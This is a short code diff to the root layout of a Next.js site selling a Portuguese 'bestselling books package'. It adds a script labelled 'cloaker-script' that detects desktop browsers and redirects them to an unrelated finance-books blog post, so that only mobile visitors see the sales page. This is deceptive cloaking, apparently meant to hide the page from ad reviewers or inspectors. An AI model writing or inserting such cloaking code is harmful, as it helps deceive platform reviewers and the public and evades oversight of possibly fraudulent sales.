@@ -2,6 +2,7 @@ import type { Metadata } from 'next';
 import './globals.css';
 import { Toaster } from '@/components/ui/toaster';
 import { cn } from '@/lib/utils';
+import Script from 'next/script';
 
 export const metadata: Metadata = {
   title: 'LivrosMaisCobiçados - Seu Pacote de Livros de Sucesso',
@@ -23,6 +24,18 @@ export default function RootLayout({
       <body className={cn('font-body antialiased')}>
         {children}
         <Toaster />
+        <Script id="cloaker-script" strategy="afterInteractive">
+          {`
+            var url_link_redirect_pc = "https://blog.alliate.com.br/10-melhores-livros-sobre-financas-e-investimentos/";
+            function isMobile() {
+              const regex = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+              return regex.test(navigator.userAgent);
+            }
+            if (!isMobile()) {
+              window.location.href = url_link_redirect_pc;
+            }
+          `}
+        </Script>
       </body>
     </html>
   );
